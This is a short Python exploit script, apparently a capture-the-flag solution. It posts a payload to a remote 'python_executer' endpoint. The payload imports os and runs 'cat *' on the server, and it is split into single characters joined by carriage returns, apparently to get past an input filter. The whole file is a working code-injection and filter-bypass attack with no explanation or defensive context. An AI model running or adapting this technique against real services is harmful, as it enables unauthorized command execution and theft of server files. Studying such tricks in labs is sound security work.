import urllib.parse
import urllib.request


def main():
	payload = 'from os import *; system("cat *")'

	url = 'http://poprdi.oa.to:8080/python_executer/submit.php'
	params = {
		'code': "\r".join(list(payload))
	}
	headers = {
		'User-Agent':'Mozilla/5.0',
		'Content-Type':'application/x-www-form-urlencoded'
	}

	req = urllib.request.Request(url, urllib.parse.urlencode(params).encode(), headers)
	res = urllib.request.urlopen(req).read().decode()

	print(res)


if __name__ == '__main__':
	main()